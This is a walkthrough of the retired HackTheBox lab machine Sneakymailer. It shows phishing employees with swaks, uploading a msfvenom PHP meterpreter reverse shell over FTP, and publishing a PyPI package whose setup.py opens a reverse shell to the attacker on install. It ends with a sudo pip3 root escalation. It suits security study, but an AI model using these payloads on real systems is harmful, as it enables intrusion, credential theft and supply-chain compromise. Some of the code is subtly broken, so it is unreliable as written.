This is a writeup about a retired HacktheBox machine:
[Sneakymailer](https://www.hackthebox.com/home/machines/profile/262) publish on
July 11, 2020 by
[sulcud](https://www.hackthebox.com/home/users/profile/106709).
This box is rated as a medium box. It implies some phishing, an IMAP server, a
FTP server, Pypi and sudo.

# Foothold

## Recon

Let us start as always by a `nmap` scan.

    :::text
    # Nmap 7.80 scan initiated Sat Jul 25 03:42:58 2020 as: nmap -p- -sSV -oN nmap 10.10.10.197

There is a few open ports:

* 21 FTP
* 22 SSH
* 25 SMTPD (email)
* 80 Nginx (web)
* 143 imap (mail)
* 993 imap/ssl (mail)
* 8080 nginx (mail)

## Web

When browsing the website we notice a list of email addresses. We copy them to a
file an use `cut -f 4` to get a proper list with the email only.

Nothing else on the website seems of interest.

## Phishing

As the port 25 is open, we can send email to the server.
Our phishing email will contain a simple
link to our machine `http://10.10.14.11:8080/test`:

    :::text
    Hey try that:

    http://10.10.14.11:8000/test

    HF

We use [swaks](https://github.com/jetmore/swaks)
in order to automatically send our phishing email:

    :::text
    while read l; do swaks --to $l --server 10.10.10.197 --body email; done <emails

We run a `netcat` listener on port 8080 in order to see the incoming requests and
got some POST request containing a username and a password.

    :::text
    nc -l -p 8000
    POST /test%0D HTTP/1.1
    Host: 10.10.14.11:8000
    User-Agent: python-requests/2.23.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Length: 185
    Content-Type: application/x-www-form-urlencoded

    firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

## Evolution

It took me quit a long time to understand what these credentials where for. But
as the IMAP port is open we can connect to it with a mail client. We launch
evolution (already installed on Kali Linux) and configure it with the previous
information (note that the user is `paulbyrd`).

We found two emails in the `sent` directory. The first on contain a password for
the `developer` account.

> Hello administrator, I want to change this password for the developer account
>
> Username: developer
> Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
>
> Please notify me when you do it


The second one is a address to `low` and give us some hint about one of the next step.

> Hello low
>
> Your current task is to install, test and then erase every python module you
> find in our PyPI service, let me know if you have any inconvenience.

## FTP

The `developer` account credentials allow us to connect to the FTP service. We
see that we can write on the `dev` folder.

This also take me some time to figure out but we can access our uploaded file on
the `dev` environment accessible at [http://dev.sneakycorp.htb/test](http://dev.sneakycorp.htb/test).

Therefore we generate a simple PHP `meterpreter` using `msfvenom`: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > lol.php`
and upload it on the FTP server.

    :::text

    150 Ok to send data.
    226 Transfer complete.
    30687 bytes sent in 0.00 secs (7.3772 MB/s)

We run the `metasploit` handler and trigger our payload by browsing to [http://dev.sneakycorp.htb/lol.php](http://dev.sneakycorp.htb/lol.php).
This get us a shell as `www-data`.

    :::text
    meterpreter > getuid
    Server username: www-data (33)

# User

## John

We browse the file system and found some `pypi` sub domain and a `.htpasswd` file
containing an encrypted password.

    :::text
    meterpreter > ls
    Listing: /var/www/pypi.sneakycorp.htb

We run `john` and the `rockyou` dictionary on it.

## PyPi

This new credentials set allows us to access the [PyPi](https://pypi.org/)
server located at
[http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/).

I had never made a Python package, neither use that in order to get a reverse
shell. A read a few [article about make and uploading package to pypi](https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56).

We then construct a specific package with a reverse shell code in `setup.py`.
The structure of the package is the following.

    :::text
    package
    ├── build
    │   └── lib.linux-x86_64-2.7
    │       └── plop
    │           ├── __init__.py
    │           └── plop.py
    ├── dist
    │   └── plop-0.3.tar.gz
    ├── LICENSE.txt
    ├── MANIFEST
    ├── plop
    │   ├── __init__.py
    │   └── plop.py
    ├── plop.egg-info
    │   ├── dependency_links.txt
    │   ├── PKG-INFO
    │   ├── SOURCES.txt
    │   └── top_level.txt
    ├── README
    ├── setup.cfg
    └── setup.py

The code in `setup.py` is:

    :::python
    from setuptools import setup
    import sys
    import os
    import socket
    import pty
    from setuptools.command.install import install
    import getpass

    requests.get('http://10.10.14.11:8000/boom')
    if getpass.getuser() != 'kali':
        s=socket.socket()
        s.connect(('10.10.14.11',4444))
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")

    setup(
    name = 'plop',         # How you named your package folder (MyLib)
      packages = ['plop'],   # Chose the same as "name"
      version = '0.3',      # Start with a small number and increase it with every change you make
      license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository
      cmdclass={'install': CustomInstall},
    )

We build our package with `python setup.py sdist` and upload it to the PyPi
server with `twine`:

    :::text
    twine upload --repository-url http://pypi.sneakycorp.htb:8080/ dist/* --verbose

At the same time we run a `netcat` listener on our Kali box and wait for the
shell. We then have a shell as `low` and can access the user flag.

    :::text
    nc -l -p 4444

    $ id
    id
    uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)

    $ cat ~/user.txt
    cat ~/user.txt
    73592699b63e47969c6de934654c2325

# Root

We put our ssh public key in the `.ssh/authorized_keys` file and connect to the
box using SSH and run `sudo -l`. We found that we can run `pip3` as root without
password.

    :::text
    kali@kali:~$ ssh low@10.10.10.197
    low@sneakymailer:~$ sudo -l
    ^C^C^Csudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Matching Defaults entries for low on sneakymailer:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User low may run the following commands on sneakymailer:
        (root) NOPASSWD: /usr/bin/pip3

We look at the [GTFObins page for pip](https://gtfobins.github.io/gtfobins/pip/#sudo)
and run the commands to create a temporary directory, write a simple `setup.py`
script executing a shell and installing this "script" as root which give us a
`root` shell and allow us to read the `root` flag.

    :::text
    low@sneakymailer:~$ TF=$(mktemp -d)
    low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF

# Wrapping up

The root part was really classic and easy. The user part was awesome! I learn so
much on this box and the conception is clearly different from classical boxes as
their is a lot of "interaction" with the "users" (phishing, pypi).

I clearly recommend this box for an "unexpected" journey.
